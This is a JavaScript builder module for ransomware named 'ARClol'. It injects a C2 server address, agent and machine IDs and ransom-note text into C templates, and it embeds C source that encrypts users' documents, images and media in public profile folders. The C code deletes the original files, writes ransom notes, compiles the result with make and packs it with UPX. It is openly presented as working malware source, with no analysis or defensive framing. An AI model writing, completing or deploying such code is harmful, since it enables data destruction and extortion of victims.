const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const crypto = require('crypto');

class ExeBuilder {
    constructor() {
        this.srcDir = path.join(__dirname, 'src');
        this.buildDir = path.join(__dirname, 'build');
        this.templatesDir = path.join(__dirname, 'templates');
        
        // Ensure build directory exists
        if (!fs.existsSync(this.buildDir)) {
            fs.mkdirSync(this.buildDir, { recursive: true });
        }
    }

    /**
     * Build executable from ransomware configuration
     * @param {Object} config - Ransomware configuration
     * @param {string} outputFormat - 'exe' or 'ps1'
     * @returns {Buffer} - Compiled executable binary
     */
    async buildExecutable(config, outputFormat = 'exe') {
        try {
            console.log('Starting executable build process...');
            
            // Generate unique build ID
            const buildId = crypto.randomBytes(8).toString('hex');
            const buildPath = path.join(this.buildDir, buildId);
            fs.mkdirSync(buildPath, { recursive: true });
            
            // Step 1: Prepare source files with configuration
            await this.prepareSourceFiles(config, buildPath);
            
            // Step 2: Compile executable
            const exePath = await this.compileExecutable(buildPath, buildId);
            
            // Step 3: Apply optimizations and packing
            const optimizedPath = await this.optimizeExecutable(exePath);
            
            // Step 4: Read final executable
            const executable = fs.readFileSync(optimizedPath);
            
            // Cleanup build directory
            fs.rmSync(buildPath, { recursive: true, force: true });
            
            console.log(`Executable built successfully: ${executable.length} bytes`);
            return executable;
            
        } catch (error) {
            console.error('Build failed:', error.message);
            throw new Error(`Executable build failed: ${error.message}`);
        }
    }

    /**
     * Prepare source files with injected configuration
     */
    async prepareSourceFiles(config, buildPath) {
        console.log('Preparing source files...');
        
        // Copy entire src directory to build directory
        const srcDir = path.join(__dirname, 'src');
        const buildSrcDir = path.join(buildPath, 'src');
        
        if (!fs.existsSync(buildSrcDir)) {
            fs.mkdirSync(buildSrcDir, { recursive: true });
        }
        
        // Copy all source files maintaining directory structure
        const copyRecursive = (src, dest) => {
            if (fs.statSync(src).isDirectory()) {
                if (!fs.existsSync(dest)) {
                    fs.mkdirSync(dest, { recursive: true });
                }
                const files = fs.readdirSync(src);
                files.forEach(file => {
                    copyRecursive(path.join(src, file), path.join(dest, file));
                });
            } else {
                let content = fs.readFileSync(src, 'utf8');
                
                // Inject configuration into main.c
                if (path.basename(src) === 'main.c') {
                    content = this.injectConfiguration(content, config);
                }
                
                fs.writeFileSync(dest, content);
            }
        };
        
        copyRecursive(srcDir, buildSrcDir);
    }

    /**
     * Inject configuration into main.c template
     */
    injectConfiguration(mainContent, config) {
        // Generate encryption keys
        const masterKey = crypto.randomBytes(32);
        const masterIv = crypto.randomBytes(16);
        
        // Format key bytes as C array
        const keyBytes = Array.from(masterKey).join(', ');
        const ivBytes = Array.from(masterIv).join(', ');
        
        // Replace configuration placeholders
        const replacements = {
            '{{C2_SERVER}}': config.c2Server || 'http://localhost:3001',
            '{{AGENT_ID}}': config.agentId || crypto.randomUUID(),
            '{{MACHINE_ID}}': config.machineId || `${process.env.COMPUTERNAME}-${process.env.USERNAME}`,
            '{{BEACON_INTERVAL}}': config.beaconInterval || 30,
            '{{NOTIFICATION_TYPE}}': config.notificationType || 'popup',
            '{{NOTIFICATION_MESSAGE}}': config.notificationMessage || 'Your files have been encrypted',
            '{{NOTIFICATION_TITLE}}': config.notificationTitle || 'ARClol Ransomware',
            '{{MASTER_KEY_BYTES}}': keyBytes,
            '{{MASTER_IV_BYTES}}': ivBytes
        };
        
        let result = mainContent;
        for (const [placeholder, value] of Object.entries(replacements)) {
            result = result.replace(new RegExp(placeholder.replace(/[{}]/g, '\\$&'), 'g'), value);
        }
        
        return result;
    }

    /**
     * Create missing implementation files
     */
    async createMissingImplementations(buildPath) {
        // Create ransom_core.c implementation
        const ransomCoreImpl = `#include "ransom_core.h"
#include "file_ops.h"
#include "crypto_engine.h"
#include <stdio.h>
#include <string.h>

// Target file extensions
const wchar_t* TARGET_EXTENSIONS[] = {
    L".doc", L".docx", L".pdf", L".txt", L".jpg", L".png", 
    L".mp3", L".mp4", L".zip", L".xlsx", L".ppt"
};
const uint32_t TARGET_EXTENSION_COUNT = sizeof(TARGET_EXTENSIONS) / sizeof(TARGET_EXTENSIONS[0]);

static ransom_config_t g_current_config;
static aes_context_t g_crypto_context;

int ransom_init(const ransom_config_t* config) {
    memcpy(&g_current_config, config, sizeof(ransom_config_t));
    aes_init(&g_crypto_context, config->master_key, config->master_iv);
    return 0;
}

int ransom_execute(ransom_results_t* results) {
    directory_list_t target_dirs = {0};
    
    // Get target directories
    if (get_target_directories(&target_dirs) != FILE_OP_SUCCESS) {
        return -1;
    }
    
    // Encrypt files in each directory
    for (uint32_t i = 0; i < target_dirs.count; i++) {
        file_info_t* files = NULL;
        uint32_t file_count = 0;
        
        if (enumerate_files_recursive(target_dirs.directories[i], TARGET_EXTENSIONS, 
                                    TARGET_EXTENSION_COUNT, &files, &file_count) == FILE_OP_SUCCESS) {
            
            for (uint32_t j = 0; j < file_count; j++) {
                if (!should_skip_file(&files[j])) {
                    wchar_t output_path[MAX_PATH];
                    wcscpy(output_path, files[j].path);
                    wcscat(output_path, L".ARClol");
                    
                    if (encrypt_file_syscall(files[j].path, output_path, 
                                           g_current_config.master_key, g_current_config.master_iv,
                                           g_current_config.machine_id) == FILE_OP_SUCCESS) {
                        results->files_encrypted++;
                        results->total_bytes_encrypted += files[j].size;
                        
                        // Delete original file
                        file_delete(files[j].path);
                    }
                }
            }
            
            if (file_count > 0) {
                ransom_write_notes(target_dirs.directories[i]);
                results->directories_processed++;
            }
            
            file_free(files);
        }
    }
    
    return 0;
}

int ransom_cleanup(void) {
    return 0;
}

int ransom_send_beacon(const char* event_type) {
    // Simplified beacon implementation
    return 0;
}

int ransom_write_notes(const wchar_t* directory) {
    wchar_t note_path[MAX_PATH];
    wcscpy(note_path, directory);
    wcscat(note_path, L"\\\\READ_ME_RESTORE_FILES.txt");
    
    HANDLE file_handle;
    if (file_open(note_path, &file_handle, GENERIC_WRITE, CREATE_ALWAYS) == FILE_OP_SUCCESS) {
        const char* note_content = 
            "Your files have been encrypted with ARClol ransomware.\\n"
            "Contact support for recovery instructions.\\n";
        
        uint32_t bytes_written;
        file_write(file_handle, note_content, strlen(note_content), &bytes_written);
        file_close(file_handle);
    }
    
    return 0;
}

int ransom_show_completion_dialog(const ransom_results_t* results) {
    // Show completion message
    return 0;
}

uint8_t should_skip_file(const file_info_t* file_info) {
    // Skip zero-byte files and already encrypted files
    if (file_info->size == 0) return 1;
    
    wchar_t* ext = wcsrchr(file_info->path, L'.');
    if (ext && wcscmp(ext, L".ARClol") == 0) return 1;
    
    return 0;
}

void anti_debug_checks(void) {
    // Basic anti-debugging
}

void environment_checks(void) {
    // Environment validation
}`;

        fs.writeFileSync(path.join(buildPath, 'ransom_core.c'), ransomCoreImpl);

        // Create file_ops.c implementation
        const fileOpsImpl = `#include "file_ops.h"
#include <stdlib.h>
#include <string.h>

file_op_result_t file_open(const wchar_t* path, HANDLE* handle, uint32_t access, uint32_t disposition) {
    UNICODE_STRING file_name;
    OBJECT_ATTRIBUTES obj_attr;
    IO_STATUS_BLOCK io_status;
    
    init_unicode_string(&file_name, path);
    init_object_attributes(&obj_attr, &file_name, OBJ_CASE_INSENSITIVE);
    
    NTSTATUS status = sys_create_file(handle, access, &obj_attr, &io_status, 
                                     NULL, FILE_ATTRIBUTE_NORMAL, 0, disposition, 0, NULL, 0);
    
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t file_read(HANDLE handle, void* buffer, uint32_t size, uint32_t* bytes_read) {
    IO_STATUS_BLOCK io_status;
    NTSTATUS status = sys_read_file(handle, NULL, NULL, NULL, &io_status, buffer, size, NULL, NULL);
    
    if (bytes_read) *bytes_read = (uint32_t)io_status.Information;
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t file_write(HANDLE handle, const void* buffer, uint32_t size, uint32_t* bytes_written) {
    IO_STATUS_BLOCK io_status;
    NTSTATUS status = sys_write_file(handle, NULL, NULL, NULL, &io_status, (PVOID)buffer, size, NULL, NULL);
    
    if (bytes_written) *bytes_written = (uint32_t)io_status.Information;
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t file_close(HANDLE handle) {
    NTSTATUS status = sys_close_handle(handle);
    return NT_SUCCESS(status) ? FILE_OP_SUCCESS : FILE_OP_ERROR_UNKNOWN;
}

file_op_result_t get_target_directories(directory_list_t* dirs) {
    // Simplified - add user profile directories
    dirs->directories = malloc(sizeof(wchar_t*) * 6);
    dirs->count = 6;
    dirs->capacity = 6;
    
    dirs->directories[0] = L"C:\\\\Users\\\\Public\\\\Documents";
    dirs->directories[1] = L"C:\\\\Users\\\\Public\\\\Pictures";
    dirs->directories[2] = L"C:\\\\Users\\\\Public\\\\Desktop";
    dirs->directories[3] = L"C:\\\\Users\\\\Public\\\\Downloads";
    dirs->directories[4] = L"C:\\\\Users\\\\Public\\\\Music";
    dirs->directories[5] = L"C:\\\\Users\\\\Public\\\\Videos";
    
    return FILE_OP_SUCCESS;
}

file_op_result_t encrypt_file_syscall(const wchar_t* input_path, const wchar_t* output_path, 
                                     const uint8_t* key, const uint8_t* iv, const char* machine_id) {
    // Simplified file encryption
    HANDLE input_handle, output_handle;
    
    if (file_open(input_path, &input_handle, GENERIC_READ, OPEN_EXISTING) != FILE_OP_SUCCESS) {
        return FILE_OP_ERROR_NOT_FOUND;
    }
    
    if (file_open(output_path, &output_handle, GENERIC_WRITE, CREATE_ALWAYS) != FILE_OP_SUCCESS) {
        file_close(input_handle);
        return FILE_OP_ERROR_ACCESS_DENIED;
    }
    
    // Read, encrypt, and write file data
    uint8_t buffer[4096];
    uint32_t bytes_read, bytes_written;
    
    while (file_read(input_handle, buffer, sizeof(buffer), &bytes_read) == FILE_OP_SUCCESS && bytes_read > 0) {
        // Simple XOR encryption for demo
        for (uint32_t i = 0; i < bytes_read; i++) {
            buffer[i] ^= key[i % 32];
        }
        
        file_write(output_handle, buffer, bytes_read, &bytes_written);
    }
    
    file_close(input_handle);
    file_close(output_handle);
    
    return FILE_OP_SUCCESS;
}

void* file_alloc(size_t size) {
    return malloc(size);
}

void file_free(void* ptr) {
    free(ptr);
}`;

        fs.writeFileSync(path.join(buildPath, 'file_ops.c'), fileOpsImpl);
    }

    /**
     * Compile executable using MinGW
     */
    async compileExecutable(buildPath) {
        console.log('Compiling executable...');
        
        const outputPath = path.join(buildPath, 'ransom.exe');
        const makeCmd = `make BUILD_DIR=${buildPath} OUTPUT=${outputPath}`;
        
        try {
            execSync(makeCmd, { cwd: path.join(__dirname), stdio: 'pipe' });
            console.log('Compilation successful');
            return outputPath;
        } catch (error) {
            console.error('Compilation failed:', error.stderr?.toString() || error.message);
            throw new Error(`Compilation failed: ${error.stderr?.toString() || error.message}`);
        }
    }

    /**
     * Optimize and pack executable
     */
    async optimizeExecutable(exePath) {
        console.log('Optimizing executable...');
        
        // Use UPX for compression if available
        try {
            const packedPath = exePath.replace('.exe', '_packed.exe');
            execSync(`upx --best --lzma -o "${packedPath}" "${exePath}"`, { stdio: 'pipe' });
            console.log('Executable packed with UPX');
            return packedPath;
        } catch (error) {
            console.log('UPX not available, using uncompressed executable');
            return exePath;
        }
    }
}

module.exports = ExeBuilder;
